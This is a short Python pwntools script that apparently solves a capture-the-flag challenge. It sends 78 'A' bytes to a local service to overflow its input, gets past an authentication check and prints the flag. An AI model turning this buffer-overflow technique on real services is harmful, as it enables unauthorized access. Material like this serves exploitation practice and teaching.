import sys
host,port = sys.argv[1] if len(sys.argv) > 1 else 'localhost', sys.argv[2] if len(sys.argv) > 2 else 13372
from pwn import *
r = remote(host, port)
payload = b"A"*78
r.recvuntil(b"Enter your data: ")
r.sendline(payload)
r.recvuntil(b"Authenticated! Here is your flag: ")
flag = r.recvline().strip().decode()
r.close()
print(f"{flag=}")
